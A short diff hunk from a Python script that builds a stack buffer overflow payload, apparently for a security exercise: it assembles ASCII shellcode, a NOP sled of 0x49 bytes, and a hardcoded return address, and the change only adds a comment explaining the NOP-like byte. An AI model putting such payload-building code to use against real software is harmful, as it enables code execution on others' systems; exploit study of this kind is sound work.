@@ -178,7 +178,7 @@ def get_payload() -> bytes:
     #encode() does not change the size of message
     asm = get_ascii_shellcode()
     NOPs_amount = size - len(asm) - 4
-    NOPs = bytes([0x49 for i in range(NOPs_amount)])
+    NOPs = bytes([0x49 for i in range(NOPs_amount)]) #dec EBX nop like op
     
     ra = struct.pack('<I', 0xBFFFDD9C) #return address
 
